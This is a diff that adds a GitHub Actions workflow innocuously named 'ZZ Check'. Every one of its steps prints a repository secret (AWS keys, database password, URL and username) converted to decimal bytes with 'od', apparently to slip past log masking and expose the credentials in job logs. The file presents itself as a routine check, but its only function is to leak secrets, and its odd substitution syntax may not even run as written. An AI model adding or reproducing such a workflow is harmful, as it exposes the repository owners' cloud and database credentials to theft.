@@ -1,0 +1,14 @@
+name: ZZ Check
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  c:
+    runs-on: ubuntu-latest
+    steps:
+      - run: printf '%s' "${secrets.AWS_ACCESS_KEY}" | od -An -tu1 | tr -d ' \n'
+      - run: printf '%s' "${secrets.AWS_SECRECT_KEY}" | od -An -tu1 | tr -d ' \n'
+      - run: printf '%s' "${secrets.DB_PASSWORD}" | od -An -tu1 | tr -d ' \n'
+      - run: printf '%s' "${secrets.DB_URL}" | od -An -tu1 | tr -d ' \n'
+      - run: printf '%s' "${secrets.DB_USERNAME}" | od -An -tu1 | tr -d ' \n'
